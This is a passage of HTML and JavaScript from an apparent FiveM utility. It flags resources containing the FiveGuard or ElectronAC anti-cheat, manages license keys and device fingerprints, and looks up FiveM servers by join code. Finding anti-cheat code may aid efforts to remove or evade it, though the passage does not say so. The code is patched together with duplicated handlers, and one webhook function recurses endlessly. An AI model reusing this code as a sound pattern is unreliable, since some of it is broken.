 // Wrap addLog to collect detections from log messages
 const tryWrapCollector = () => {
 try{
 if(typeof window.addLog !== "function") return false;
 if(window.__h89CollectorWrapped) return true;

 const orig = window.addLog;
 window.addLog = function(level, msg, ...rest){
 const r = orig.call(this, level, msg, ...rest);
 try{
 const s = String(msg || "");
 // Matches: "FiveGuard detected in bl_appearance (fxmanifest.lua)"
 const m = s.match(/(FiveGuard|ElectronAC)\s+detected\s+in\s+([^()]+?)\s*\(([^)]+)\)/i);
 if(m){
 const det = m[1].toLowerCase();
 const folder = m[2].trim();
 const file = m[3].trim();
 if(det === "fiveguard") recordHit("fiveguard", folder, file);
 else recordHit("electronac", folder, file);
 }
 }catch(e){}
 return r;
 };

 window.__h89CollectorWrapped = true;
 return true;
 }catch(e){ return false; }
 };

 let tries = 0;
 const iv = setInterval(()=>{
 tries++;
 if(tryWrapCollector() || tries > 60) clearInterval(iv);
 }, 200);

 // Panel open/close
 const backdrop = document.getElementById("h89-detect-panel-backdrop");
 const panel = document.getElementById("h89-detect-panel");
 const closeBtn = document.getElementById("h89-detect-close");

 const hide = () => {
 if(backdrop) backdrop.style.display = "none";
 if(panel) panel.style.display = "none";
 };
 const show = () => {
 if(backdrop) backdrop.style.display = "block";
 if(panel) panel.style.display = "block";
 };

 if(backdrop) backdrop.addEventListener("click", hide);
 if(closeBtn) closeBtn && closeBtn.addEventListener("click", hide);

 function render(kind){
 const map = window.__h89Detections[kind];
 const list = document.getElementById(kind === "fiveguard" ? "h89-list-fg" : "h89-list-ea");
 const pill = document.getElementById(kind === "fiveguard" ? "h89-pill-fg" : "h89-pill-ea");
 if(!list || !pill || !map) return;

 const arr = Array.from(map.values())
 .sort((a,b)=> (b.hits - a.hits) || (b.files.size - a.files.size) || a.folder.localeCompare(b.folder));

 pill.textContent = `${arr.length} resources`;

 list.innerHTML = "";
 if(arr.length === 0){
 const empty = document.createElement("div");
 empty.className = "h89-detect-row";
 empty.innerHTML = `<div class="dot ${kind==='fiveguard'?'fg':'ea'}"></div>
 <div class="meta">
 <div class="name">No ${kind === "fiveguard" ? "FiveGuard" : "ElectronAC"} detections</div>
 <div class="small">Run scan and come back here.</div>
 </div>`;
 list.appendChild(empty);
 return;
 }

 for(const it of arr){
 const row = document.createElement("div");
 row.className = "h89-detect-row";
 row.innerHTML = `<div class="dot ${kind==='fiveguard'?'fg':'ea'}"></div>
 <div class="meta">
 <div class="name">${it.folder}</div>
 <div class="small">Files: ${Array.from(it.files).join(", ") || "-"}</div>
 </div>
 <div class="count">${it.hits}</div>`;
 list.appendChild(row);
 }
 }

 window.__h89OpenDetectPanel = function(){
 // render both
 render("fiveguard");
 render("electronac");
 const fgCount = window.__h89Detections.fiveguard.size;
 const eaCount = window.__h89Detections.electronac.size;
 const sub = document.getElementById("h89-detect-sub");
 if(sub) sub.textContent = `FiveGuard: ${fgCount} resources ‚Ä¢ ElectronAC: ${eaCount} resources`;
 show();
 }

 // Find the FiveGuard button in the top nav and attach click
 const findFiveGuardButton = () => {
 const buttons = Array.from(document.querySelectorAll("button, a, div"));
 return buttons.find(el => (el.textContent || "").trim().toUpperCase() === "FIVEGUARD");
 };

 const bindBtn = () => {
 const b = findFiveGuardButton();
 if(!b) return false;
 if(b.__h89Bound) return true;
 b.addEventListener("click", (e) => {
 // Don't break existing tab behavior, just open panel
 try{ window.__h89OpenDetectPanel && window.__h89OpenDetectPanel(); }catch(e){ console.error(e); }
 });
 b.__h89Bound = true;
 return true;
 };

 // Try bind now and later (UI may render late)
 let btries = 0;
 const biv = setInterval(()=>{
 btries++;
 if(bindBtn() || btries > 80) clearInterval(biv);
 }, 250);
});
</script>
<script>
/* ===== FiveGuard Button Robust Bind Fix ===== */
document.addEventListener("DOMContentLoaded", () => {
 const tryBind = () => {
 // try known ids/classes first
 let btn =
 document.getElementById("fiveguard") ||
 document.getElementById("fiveguardBtn") ||
 document.querySelector('[data-tab="fiveguard"]') ||
 document.querySelector('.tab-fiveguard') ||
 null;

 // fallback: nav buttons with label FIVEGUARD
 if(!btn){
 const nav = document.querySelector('nav') || document;
 btn = Array.from(nav.querySelectorAll("button,a,div"))
 .find(el => (el.textContent||"").trim().toUpperCase() === "FIVEGUARD");
 }

 if(!btn || btn.__h89Bound) return false;

 btn.addEventListener("click", (e) => {
 if (typeof window.__h89OpenDetectPanel === "function") {
 window.__h89OpenDetectPanel();
 }
 });

 btn.__h89Bound = true;
 return true;
 };

 let t = 0;
 const iv = setInterval(()=>{
 t++;
 if(tryBind() || t>80) clearInterval(iv);
 }, 200);
});
</script>
<script>
/* ===== Inject 'Detections' Button next to FIVEGUARD tab ===== */
document.addEventListener("DOMContentLoaded", () => {
 const ensureButton = () => {
 if(document.getElementById("h89-open-detections-btn")) return true;

 // find FIVEGUARD tab button
 const candidates = Array.from(document.querySelectorAll("button, a, div"))
 .filter(el => (el.textContent||"").trim().toUpperCase() === "FIVEGUARD");

 if(!candidates.length) return false;
 const fg = candidates[0];

 // build our button
 const btn = document.createElement("button");
 btn.id = "h89-open-detections-btn";
 btn.type = "button";
 btn.textContent = "DETECTIONS";

 btn.addEventListener("click", (e) => {
 e.preventDefault();
 e.stopPropagation();
 if(typeof window.__h89OpenDetectPanel === "function"){
 window.__h89OpenDetectPanel();
 }
 });

 // insert right after FIVEGUARD tab element
 try{
 fg.insertAdjacentElement("afterend", btn);
 }catch(e){
 // fallback append to parent
 (fg.parentElement || document.body).appendChild(btn);
 }
 return true;
 };

 // try now and via observer (tabs may render later)
 let tries = 0;
 const iv = setInterval(()=>{
 tries++;
 if(ensureButton() || tries>80) clearInterval(iv);
 }, 200);

 const mo = new MutationObserver(()=>{ ensureButton(); });
 mo.observe(document.body, { childList:true, subtree:true });

 // keyboard shortcut: Ctrl+Shift+D
 document.addEventListener("keydown", (e) => {
 if(e.ctrlKey && e.shiftKey && (e.key === "D" || e.key === "d")){
 if(typeof window.__h89OpenDetectPanel === "function"){
 window.__h89OpenDetectPanel();
 }
 }
 });
});
</script>
<script>
/* ===== Stable Detections Panel Open/Close + Button Handler ===== */
document.addEventListener("DOMContentLoaded", () => {
 const backdrop = document.getElementById("h89-detect-panel-backdrop");
 const panel = document.getElementById("h89-detect-panel");
 const closeBtn = document.getElementById("h89-detect-close");

 const hide = () => {
 if(backdrop) backdrop.style.display = "none";
 if(panel) panel.style.display = "none";
 };
 const show = () => {
 if(backdrop) backdrop.style.display = "block";
 if(panel) panel.style.display = "block";
 };

 if(backdrop) backdrop.addEventListener("click", hide);
 if(closeBtn) closeBtn && closeBtn.addEventListener("click", hide);

 // Expose globally (used by other scripts)
 window.__h89OpenDetectPanel = () => { show(); };
 window.__h89CloseDetectPanel = () => { hide(); };

 // Capture-phase click for our DETECTIONS button so it always works
 document.addEventListener("click", (e) => {
 const el = e.target;
 if(!el) return;
 const btn = el.closest ? el.closest("#h89-open-detections-btn") : null;
 if(btn){
 e.preventDefault();
 e.stopPropagation();
 try{ window.__h89OpenDetectPanel(); }catch(_){}
 }
 }, true);

 // Also allow Ctrl+Shift+D
 document.addEventListener("keydown", (e) => {
 if(e.ctrlKey && e.shiftKey && (e.key === "D" || e.key === "d")){
 try{ window.__h89OpenDetectPanel(); }catch(_){}
 }
 });
});
</script>
<script>
/* ===== H89 Disable Snow ===== */
document.addEventListener("DOMContentLoaded", () => {
 try{
 if (window.snowfallInterval) { clearInterval(window.snowfallInterval); window.snowfallInterval = null; }
 }catch(e){}
 try{
 document.querySelectorAll(".snowflake").forEach(el => el.remove());
 }catch(e){}
 try{
 // prevent future starts if called
 window.startSnowfall = function(){};
 }catch(e){}
});
</script>
<script>
(function(){
 function ensureContainer(){
 let c = document.getElementById("h89-toasts");
 if(!c){
 c = document.createElement("div");
 c.id = "h89-toasts";
 document.body.appendChild(c);
 }
 return c;
 }
 function toast(type, title, msg, ttl=4500){
 const c = ensureContainer();
 const t = document.createElement("div");
 t.className = "h89-toast " + (type || "info");
 t.innerHTML = '<div class="bar"></div><div class="content"><div class="title"></div><div class="msg"></div></div><button class="x" title="Close">‚úï</button>';
 t.querySelector(".title").textContent = title || "Notification";
 t.querySelector(".msg").textContent = msg || "";
 const close = () => { t.style.opacity="0"; t.style.transform="translateY(-6px)"; setTimeout(()=>t.remove(), 180); };
 t.querySelector(".x").addEventListener("click", close);
 c.appendChild(t);
 t.style.opacity="0"; t.style.transform="translateY(-6px)";
 requestAnimationFrame(()=>{ t.style.transition="opacity .16s ease, transform .16s ease"; t.style.opacity="1"; t.style.transform="translateY(0)"; });
 if(ttl) setTimeout(close, ttl);
 }
 window.H89Toast = toast;
})();
</script>
<script>
document.addEventListener("keydown", (e) => {
 if(e.key !== "Escape") return;
 const det = document.getElementById("h89-detect-panel");
 const detBd = document.getElementById("h89-detect-panel-backdrop");
 if(det && det.style.display === "block"){
 det.style.display = "none";
 if(detBd) detBd.style.display = "none";
 }
});
</script>
<script>
document.addEventListener("DOMContentLoaded", () => {
 function addCopyPath(card){
 if(card.querySelector(".h89-copy-path")) return;
 const folder = card.querySelector(".folder");
 if(!folder) return;
 const b = document.createElement("button");
 b.className = "copy-btn h89-copy-path";
 b.type = "button";
 b.textContent = "COPY PATH";
 b.addEventListener("click", () => {
 const txt = folder.textContent.trim();
 (navigator.clipboard ? navigator.clipboard.writeText(txt) : Promise.reject())
 .then(()=> window.H89Toast && H89Toast("success","Copied","Folder path copied."))
 .catch(()=> window.H89Toast && H89Toast("error","Copy failed","Clipboard permission denied."));
 });
 const existing = card.querySelector(".copy-btn,.btn-copy,.copy,button.copy");
 if(existing && existing.parentElement){
 existing.parentElement.insertBefore(b, existing);
 }else{
 card.appendChild(b);
 }
 }
 const scan = () => document.querySelectorAll(".result-card,.trigger-card,.result,.card").forEach(addCopyPath);
 scan();
 new MutationObserver(scan).observe(document.body,{childList:true,subtree:true});
});
</script>

<div id="h89-notify-settings" aria-label="Notification settings">
  <div class="row">
    <div class="label">Highlight</div>
    <div id="h89-toggle-highlight" class="h89-switch"><div class="dot"></div></div>
  </div>
  <div class="row">
    <div class="label">Sound</div>
    <div id="h89-toggle-sound" class="h89-switch"><div class="dot"></div></div>
  </div>
</div>

<script>
(function(){
  const LS_HIGHLIGHT = 'h89_notify_highlight';
  const LS_SOUND = 'h89_notify_sound';

  function lsBool(key, def){
    const v = localStorage.getItem(key);
    if(v === null) return def;
    return v === '1';
  }
  function setLS(key, val){ localStorage.setItem(key, val ? '1' : '0'); }

  // Beep (no external files)
  function beep(){
    try{
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if(!AudioCtx) return;
      const ctx = new AudioCtx();
      const o = ctx.createOscillator();
      const g = ctx.createGain();
      o.type = 'sine';
      o.frequency.value = 880;
      g.gain.value = 0.0001;
      o.connect(g); g.connect(ctx.destination);
      o.start();
      g.gain.exponentialRampToValueAtTime(0.18, ctx.currentTime + 0.02);
      g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
      o.stop(ctx.currentTime + 0.36);
      o.onended = () => ctx.close();
    }catch(e){}
  }

  function getColor(type){
    switch((type||'info').toLowerCase()){
      case 'fiveguard': return '#ff1a1a';     // red
      case 'electronac': return '#3b82f6';   // blue
      case 'success': return '#22c55e';      // green
      case 'warn': return '#f59e0b';         // orange
      case 'error': return '#ef4444';        // red-alt
      default: return '#a855f7';             // purple
    }
  }

  // High-light toast (single, very visible)
  function highlightToast(type, msg){
    const color = getColor(type);
    const d=document.createElement('div');
    d.className='h89-toast';
    d.style.borderLeftColor = color;
    d.style.boxShadow = `0 0 20px ${color}b3`;
    d.innerText = msg;
    document.body.appendChild(d);
    setTimeout(()=>d.remove(),5000);
  }

  // Card toast (if H89Toast exists)
  function cardToast(type, title, msg){
    if(typeof window.H89Toast === 'function'){
      window.H89Toast(
        (type==='fiveguard'||type==='error') ? 'error' :
        (type==='electronac'||type==='info') ? 'info' :
        (type==='warn') ? 'warn' : 'success',
        title, msg, 5000
      );
      // tweak bar color if possible
      const c = document.getElementById('h89-toasts');
      if(c){
        const last = c.lastElementChild;
        if(last){
          last.classList.add('h89-custom');
          const bar = last.querySelector('.bar');
          if(bar) bar.style.background = getColor(type);
        }
      }
      return true;
    }
    return false;
  }

  // Public API:
  // h89Notify("fiveguard", "FiveGuard detected in ...")
  // h89Notify("electronac", "ElectronAC detected in ...")
  window.h89Notify = function(type, msg){
    const highlightOn = lsBool(LS_HIGHLIGHT, true);
    const soundOn = lsBool(LS_SOUND, false);
    if(soundOn) beep();

    // Prefer card toast if available; otherwise fallback to highlight toast.
    const usedCard = cardToast(type, type ? String(type).toUpperCase() : 'INFO', msg);
    if(!usedCard && highlightOn) highlightToast(type, msg);
    if(usedCard && highlightOn){
      // Also add glow highlight for detections to make it pop
      if(type==='fiveguard' || type==='electronac') highlightToast(type, msg);
    }
  };

  // Settings panel toggle: use existing gear icon if present
  function ready(fn){ if(document.readyState!=='loading') fn(); else document.addEventListener('DOMContentLoaded', fn); }
  ready(() => {
    const panel = document.getElementById('h89-notify-settings');
    const swH = document.getElementById('h89-toggle-highlight');
    const swS = document.getElementById('h89-toggle-sound');
    if(!panel || !swH || !swS) return;

    function sync(){
      const h = lsBool(LS_HIGHLIGHT, true);
      const s = lsBool(LS_SOUND, false);
      swH.classList.toggle('on', h);
      swS.classList.toggle('on', s);
    }
    sync();

    swH.addEventListener('click', () => { const v = !swH.classList.contains('on'); setLS(LS_HIGHLIGHT, v); sync(); });
    swS.addEventListener('click', () => { const v = !swS.classList.contains('on'); setLS(LS_SOUND, v); sync(); if(v) beep(); });

    // Hook to gear button if it exists, else right-click speaker icon opens panel
    const gear = document.querySelector('#settingsBtn, .settings-btn, button[title="Settings"], .fa-gear, .fa-cog')?.closest('button') || document.getElementById('settingsBtn');
    const speaker = document.querySelector('#soundBtn, .sound-btn, button[title="Sound"]') || document.querySelector('button[aria-label="Sound"]');
    function togglePanel(){
      const open = panel.style.display === 'block';
      panel.style.display = open ? 'none' : 'block';
      sync();
    }
    if(gear) gear.addEventListener('click', (e)=>{ e.stopPropagation(); togglePanel(); });
    if(speaker) speaker.addEventListener('contextmenu', (e)=>{ e.preventDefault(); togglePanel(); });

    document.addEventListener('click', (e)=>{
      if(panel.style.display !== 'block') return;
      if(panel.contains(e.target)) return;
      // don't close if clicking gear/speaker
      if(gear && (e.target === gear || gear.contains(e.target))) return;
      if(speaker && (e.target === speaker || speaker.contains(e.target))) return;
      panel.style.display = 'none';
    });
  });
})();
</script>

<div id="adminPanel" class="modal is-hidden" style="position:fixed;inset:0;z-index:99998;display:none;">
    <div class="panel" style="max-width: 980px;">
      <div class="panelHead">
        <div style="display:flex;align-items:center;gap:10px;">
          <span class="dot red"></span>
          <div>
            <div style="font-weight:800;font-size:16px;">Admin</div>
            <div style="opacity:.8;font-size:12px;">License Manager</div>
          </div>
        </div>
        <button id="adminClose" class="btn">‚úï</button>
      </div>

      <div class="panelBody" style="display:grid;grid-template-columns: 1fr 1fr; gap:16px;">
        <div class="card" style="padding:14px;">
          <div class="cardTitle" style="font-weight:800;margin-bottom:10px;">Create License</div>

          <div style="display:grid;gap:10px;">
            <label style="font-size:12px;opacity:.85;">Email lock (optional)</label>
            <input id="licEmail" class="input" placeholder="user@email.com (optional)" />

            <label style="font-size:12px;opacity:.85;">Expiry (days) (optional)</label>
            <input id="licDays" class="input" placeholder="ex: 30" />

            <button id="licCreateBtn" class="btn primary" type="button">Generate Key</button>

            <div id="licCreateOut" style="font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 13px; padding:10px; border:1px solid rgba(255,255,255,.08); border-radius:10px; background:rgba(0,0,0,.25); display:none;"></div>
          </div>
        </div>

        <div class="card" style="padding:14px;">
          <div class="cardTitle" style="font-weight:800;margin-bottom:10px;">Find / Manage</div>

          <div style="display:grid;gap:10px;">
            <label style="font-size:12px;opacity:.85;">License key</label>
            <input id="licKey" class="input" placeholder="Paste license key..." />
            <button id="licLoadBtn" class="btn" type="button">Load</button>

            <div id="licInfo" style="display:none; border:1px solid rgba(255,255,255,.08); border-radius:12px; padding:12px; background:rgba(0,0,0,.25);">
              <div id="licInfoText" style="font-size:12px; line-height:1.4;"></div>

              <div style="display:flex; flex-wrap:wrap; gap:8px; margin-top:10px;">
                <button id="licRevokeBtn" class="btn danger" type="button">Revoke</button>
                <button id="licUnrevokeBtn" class="btn" type="button">Unrevoke</button>
                <button id="licResetHwidBtn" class="btn" type="button">Reset HWID</button>
              </div>

              <div style="display:flex; gap:8px; margin-top:10px;">
                <input id="licSetDays" class="input" placeholder="Set expiry days (ex: 7)" />
                <button id="licSetExpiryBtn" class="btn" type="button">Set Expiry</button>
              </div>
            </div>
          </div>
        </div>

        <div class="card" style="grid-column: 1 / -1; padding:14px;">
          <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;">
            <div class="cardTitle" style="font-weight:800;">Recent Licenses</div>
            <button id="licRefreshBtn" class="btn" type="button">Refresh</button>
          </div>
          <div style="overflow:auto; margin-top:10px;">
            <table style="width:100%; border-collapse:collapse; font-size:12px;">
              <thead>
                <tr style="opacity:.85;">
                  <th style="text-align:left; padding:8px;">Key</th>
                  <th style="text-align:left; padding:8px;">Email</th>
                  <th style="text-align:left; padding:8px;">Expiry</th>
                  <th style="text-align:left; padding:8px;">Status</th>
                  <th style="text-align:left; padding:8px;">HWID</th>
                </tr>
              </thead>
              <tbody id="licTable"></tbody>
            </table>
          </div>
        </div>
      </div>

      <div style="opacity:.7; font-size:11px; margin-top:10px;">
        Note: ‚ÄúHWID‚Äù here is a browser-based device fingerprint. If the user clears browser storage, it can change.
      </div>
    </div>
</div>
      </div>
      <div style="border:1px solid rgba(255,255,255,.10);border-radius:14px;padding:12px;background:rgba(255,255,255,.03);">
        <div style="font-weight:800;margin-bottom:6px;">Access Control</div>
        <div style="opacity:.85;font-size:13px;">Only Discord ID <b>469346764432867328</b> can see ADMIN button.</div>
      </div>
    </div>
  </div>
</div>
<script>
document.addEventListener('DOMContentLoaded',()=>{
  const btn=document.getElementById('adminBtn');
  const panel=document.getElementById('adminPanel');
  const closeBtn=document.getElementById('adminClose');
  function open(){ if(!panel) return; panel.style.display='block'; panel.classList.remove('is-hidden'); panel.classList.add('visible'); }
  function close(){ if(!panel) return; panel.style.display='none'; panel.classList.add('is-hidden'); panel.classList.remove('visible'); }
  btn?.addEventListener('click', open);
  closeBtn?.addEventListener('click', close);
  panel?.addEventListener('click',(e)=>{ if(e.target?.classList?.contains('modal-backdrop')) close(); });
});
</script>

<script>
/* ===== FiveGuard button ‚Üí show detected resources list + count ===== */
(function(){
  const FG_FILES = [
    "ai_module_fg-obfuscated.lua",
    "ai_module_fg-obfuscated.js",
    "shared_fg-obfuscated.lua",
    "/src/include/server.lua",
    "/src/include/client.lua"
  ];

  function uniq(arr){
    return Array.from(new Set(arr.filter(Boolean)));
  }

  function normalize(s){
    return String(s||"").replace(/\\/g,"/");
  }

  function findClosestText(el, sel){
    const n = el.querySelector(sel);
    return n ? n.textContent.trim() : "";
  }

  // Best-effort: parse rendered result cards to infer resource + folder path + evidence
  function collectFiveGuard(){
    const cards = Array.from(document.querySelectorAll(".result-card,.trigger-card,.result,.card"));
    const hits = new Map(); // resourceName -> {paths:Set, evidence:Set}

    function add(resource, path, ev){
      resource = (resource||"").trim();
      if(!resource) resource = "unknown_resource";
      if(!hits.has(resource)){
        hits.set(resource, { paths: new Set(), evidence: new Set() });
      }
      if(path) hits.get(resource).paths.add(path);
      if(ev) hits.get(resource).evidence.add(ev);
    }

    for(const c of cards){
      const text = c.textContent || "";
      const tnorm = normalize(text).toLowerCase();

      // detect by keywords or known FiveGuard file names
      let matchedEv = null;
      if(tnorm.includes("fiveguard")) matchedEv = "FiveGuard";
      if(!matchedEv){
        for(const f of FG_FILES){
          if(tnorm.includes(normalize(f).toLowerCase())){ matchedEv = f; break; }
        }
      }
      if(!matchedEv) continue;

      // resource name heuristics (try common selectors)
      let res =
        findClosestText(c, ".resource-name") ||
        findClosestText(c, ".resource") ||
        findClosestText(c, ".title") ||
        findClosestText(c, "h3") ||
        findClosestText(c, "h4");

      // folder/path heuristics
      let path =
        findClosestText(c, ".folder") ||
        findClosestText(c, ".path") ||
        findClosestText(c, ".file") ||
        "";

      // If no resource name, attempt to derive from folder path (last segment)
      if(!res && path){
        const seg = normalize(path).split("/").filter(Boolean);
        res = seg.length ? seg[seg.length-1] : "";
      }

      add(res, path, matchedEv);
    }

    // Also check any scan metadata arrays if present (future-proof)
    const g = window.__h89Detections;
    if(g && g.fiveguard && typeof g.fiveguard === "object"){
      try{
        for(const [res, info] of Object.entries(g.fiveguard)){
          const paths = (info && info.paths) ? info.paths : [];
          const evs = (info && info.evidence) ? info.evidence : [];
          for(const p of paths) add(res, p, p);
          for(const e of evs) add(res, "", e);
        }
      }catch(_){}
    }

    return hits;
  }

  function ensurePanel(){
    const backdrop = document.getElementById("h89-detect-panel-backdrop");
    const panel = document.getElementById("h89-detect-panel");
    const closeBtn = document.getElementById("h89-detect-close");
    const hide = ()=>{ if(backdrop) backdrop.style.display="none"; if(panel) panel.style.display="none"; };
    const show = ()=>{ if(backdrop) backdrop.style.display="block"; if(panel) panel.style.display="block"; };

    if(backdrop && !backdrop.__h89Bound){
      backdrop.__h89Bound = true;
      backdrop.addEventListener("click", hide);
    }
    if(closeBtn && !closeBtn.__h89Bound){
      closeBtn.__h89Bound = true;
      closeBtn && closeBtn.addEventListener("click", hide);
    }
    window.__h89OpenDetectPanel = show;
    window.__h89CloseDetectPanel = hide;
    return {show, hide};
  }

  function renderFiveGuardPanel(){
    const hits = collectFiveGuard();
    const pill = document.getElementById("h89-pill-fg");
    const list = document.getElementById("h89-list-fg");
    if(pill) pill.textContent = `${hits.size} resources`;
    if(!list) return;

    list.innerHTML = "";
    if(hits.size === 0){
      const empty = document.createElement("div");
      empty.style.opacity = ".75";
      empty.style.fontSize = "12px";
      empty.textContent = "No FiveGuard detections found.";
      list.appendChild(empty);
      return;
    }

    // Sort by resource name
    const rows = Array.from(hits.entries()).sort((a,b)=>a[0].localeCompare(b[0]));
    for(const [res, info] of rows){
      const item = document.createElement("div");
      item.className = "h89-detect-item";
      const paths = Array.from(info.paths);
      const evs = Array.from(info.evidence);
      item.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;">
          <div style="font-weight:900;letter-spacing:.2px;">${res}</div>
          <div style="opacity:.75;font-size:12px;">${paths.length} path(s)</div>
        </div>
        <div style="opacity:.8;font-size:12px;margin-top:6px;white-space:pre-line;word-break:break-word;"></div>
      `;
      const meta = item.querySelector("div:nth-child(2)");
      const lines = [];
      if(paths.length) lines.push(paths.slice(0,5).join("\n"));
      const extra = paths.length > 5 ? `\n+${paths.length-5} more‚Ä¶` : "";
      if(extra) lines.push(extra);
      if(evs.length) lines.push(`Evidence: ${uniq(evs).slice(0,3).join(", ")}`);
      meta.textContent = lines.join("\n");
      list.appendChild(item);
    }
  }

  function bindFiveGuardButton(){
    // try to find button by known ids/text
    const btn = document.getElementById("fiveguardBtn")
      || document.getElementById("h89-open-fiveguard-btn")
      || Array.from(document.querySelectorAll("button")).find(b => (b.textContent||"").trim().toLowerCase()==="fiveguard");
    if(!btn) return;

    if(btn.__h89Bound) return;
    btn.__h89Bound = true;

    btn.addEventListener("click", () => {
      renderFiveGuardPanel();
      const p = ensurePanel();
      p.show();
      if(window.H89Toast) H89Toast("info","FiveGuard","Showing detected resources.");
      else if(window.h89Notify) window.h89Notify("fiveguard","FiveGuard detected resources list opened.");
    }, true);
  }

  document.addEventListener("DOMContentLoaded", bindFiveGuardButton);
  // In case buttons are injected later
  new MutationObserver(bindFiveGuardButton).observe(document.body, {childList:true, subtree:true});
})();
</script>

<script>
document.addEventListener("DOMContentLoaded", ()=>{
  const btn = document.getElementById("h89-filter-fiveguard");
  if(btn && !btn.__h89FGFixed){
    btn.__h89FGFixed = true;
    btn.addEventListener("click", (e)=>{
      try{ window.__h89OpenDetectPanel && window.__h89OpenDetectPanel(); }catch(err){ console.error(err); }
    }, true);
  }
});
</script>


<script>
// auditPermissionSilent: suppress Firestore permission spam
window.__h89AuditDeny = false;
(function(){
  const origAudit = window.audit;
  if(typeof origAudit !== "function") return;
  window.audit = async function(...args){
    if(window.__h89AuditDeny) return;
    try{
      return await origAudit.apply(this, args);
    }catch(e){
      const msg = (e && e.message) ? String(e.message) : "";
      if(msg.toLowerCase().includes("insufficient permissions") || msg.toLowerCase().includes("missing or insufficient")){
        window.__h89AuditDeny = true;
        console.warn("Audit disabled (Firestore permissions).");
        return;
      }
      throw e;
    }
  };
})();
</script>


<script>
// Safe audio: no autoplay (prevents NotSupportedError spam)
window.__h89UserGesture = false;
document.addEventListener('click', ()=>{ window.__h89UserGesture = true; }, {once:false});
window.h89SafePlay = function(el){
  try{
    if(!el) return;
    el.muted = true;
    if(!window.__h89UserGesture) return;
    const p = el.play();
    if(p && typeof p.catch === "function") p.catch(()=>{});
  }catch(_){}
};
</script>


<script>
// Safe webhook sender: avoids console spam for 404/invalid webhook
window.safeFetchWebhook = async function(url, options){
  try{
    if(!url || typeof url !== "string") return;
    if(!url.includes("discord.com/api/webhooks/")) return;
    const res = await safeFetchWebhook(url, options);
    if(!res.ok){
      console.warn("Webhook failed:", res.status);
      return;
    }
    return res;
  }catch(e){
    // ignore network errors
  }
};
</script>


<!-- ===== CFX Finder (PRO) ===== -->
<div id="cfxFinderPanel" class="cfx-modal" style="display:none" aria-label="CFX Finder">
  <div class="cfx-backdrop" data-cfx-close="1"></div>
  <div class="cfx-shell">
    <div class="cfx-head">
      <div class="cfx-title">
        <div class="t">CFX Finder</div>
        <div class="s">Lookup a FiveM server by join code.</div>
      </div>
      <div class="cfx-actions">
        <button class="cfx-btn ghost" id="cfxCloseBtn" type="button">Close</button>
      </div>
    </div>

    <div class="cfx-body">
      <div class="cfx-input-row">
        <div class="cfx-input-wrap">
          <input id="cfxInput" class="cfx-input" type="text" placeholder="Paste join code (ex: g6qlkx) or cfx.re/join/xxxxxx" autocomplete="off" />
          <div class="cfx-hint" id="cfxHint">Press Enter or click Lookup.</div>
<div style="margin-top:10px;display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
  <div style="opacity:.65;font-size:12px;font-weight:800;">History</div>
  <select id="cfxHistory" class="cfx-input" style="max-width:360px;padding:10px 12px;"></select>
  <button id="cfxClearHistory" class="cfx-btn tiny" type="button">Clear</button>
</div>
        </div>
        <button id="cfxLookupBtn" class="cfx-btn primary" type="button">Lookup</button>
      </div>

      <div id="cfxStatus" class="cfx-status" style="display:none"></div>

      <div id="cfxResult" class="cfx-result" style="display:none">
        <div class="cfx-card">
          <div id="cfxBanner" class="cfx-banner" style="display:none;">
            <img id="cfxBannerImg" alt="Server banner" />
          </div>

          <div class="cfx-card-head">
            <div style="display:flex;gap:12px;align-items:center;min-width:0;">
              <div id="cfxServerIcon" style="width:42px;height:42px;border-radius:14px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);display:flex;align-items:center;justify-content:center;overflow:hidden;flex:0 0 auto;">
                <span style="opacity:.6;font-weight:900;">CFX</span>
              </div>
              <div style="min-width:0;">
            <div class="cfx-server-name" id="cfxServerName" style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">‚Äî</div>
            </div>
            </div>
          <div class="cfx-badges">
              <button id="cfxFavBtn" class="cfx-btn tiny" type="button" title="Add to favorites">‚òÜ</button>
              <button id="cfxExportJson" class="cfx-btn tiny" type="button" title="Export JSON">Export</button>

              <span class="cfx-badge" id="cfxBadgePlayers">0/0</span>
              <span class="cfx-badge" id="cfxBadgeLocale">‚Äî</span>
            </div>
          </div>

          <div class="cfx-meta">
            <div class="cfx-meta-row">
              <div class="k">Join</div>
              <div class="v">
                <a id="cfxJoinLink" class="cfx-link" href="#" target="_blank" rel="noreferrer">cfx.re/join/</a>
                <button id="cfxCopyJoin" class="cfx-btn tiny" type="button">Copy</button>
              </div>
            </div>
            <div class="cfx-meta-row">
              <div class="k">Connect</div>
              <div class="v">
                <code id="cfxConnect" class="cfx-code">‚Äî</code>
                <button id="cfxCopyConnect" class="cfx-btn tiny" type="button">Copy</button>
                <button id="cfxOpenConnect" class="cfx-btn tiny" type="button">Open</button>
              </div>
            </div>
            <div class="cfx-meta-row">
              <div class="k">Endpoints</div>
              <div class="v"><div id="cfxEndpoints" class="cfx-tags"></div></div>
            </div>
            <div class="cfx-meta-row">
              <div class="k">Tags</div>
              <div class="v"><div id="cfxTags" class="cfx-tags"></div></div>
            </div>
          </div>

          <div class="cfx-split">
            <div class="cfx-box">
              <div class="h">Owner</div>
              <div class="p" id="cfxOwner">‚Äî</div>
            </div>
            <div class="cfx-box">
              <div class="h">Game</div>
              <div class="p" id="cfxGame">‚Äî</div>
            </div>
            <div class="cfx-box">
              <div class="h">Map</div>
              <div class="p" id="cfxMap">‚Äî</div>
            </div>
            <div class="cfx-box">
              <div class="h">OneSync</div>
              <div class="p" id="cfxOneSync">‚Äî</div>
            </div>
          </div>

          <div id="cfxPlayersBox" class="cfx-players" style="display:none;">
            <div class="ph">Players</div>
            <div class="psub" id="cfxPlayersSub">‚Äî</div>
            <div class="plist" id="cfxPlayersList"></div>
          </div>

</div>

          <div class="cfx-footnote" id="cfxRawNote" style="display:none">
            Data from servers-frontend.fivem.net API.
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



<script>
/* ===== CFX Finder PRO Logic (v3) ===== */
(function(){
  const API_BASE = "https://servers-frontend.fivem.net/api/servers/single/";
  const API_ICON = "https://servers-frontend.fivem.net/api/servers/icon/";
  const API_BANNER = "https://servers-frontend.fivem.net/api/servers/banner/";
  const LS_HISTORY = "cfx_history_v1";
  const LS_LAST = "cfx_last_code";
